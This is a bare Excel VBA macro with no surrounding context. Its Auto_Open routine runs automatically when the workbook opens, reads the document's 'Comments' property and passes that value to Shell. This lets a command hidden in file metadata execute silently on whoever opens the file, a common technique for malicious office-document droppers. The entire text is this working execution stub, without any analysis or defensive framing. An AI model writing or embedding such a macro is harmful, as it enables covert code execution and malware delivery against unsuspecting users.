Sub Auto_Open()
Dim prop As DocumentProperty
 For Each prop In ActiveWorkbook.BuiltinDocumentProperties
    If prop.Name = "Comments" Then
        Shell prop.Value
    End If
 Next
End Sub
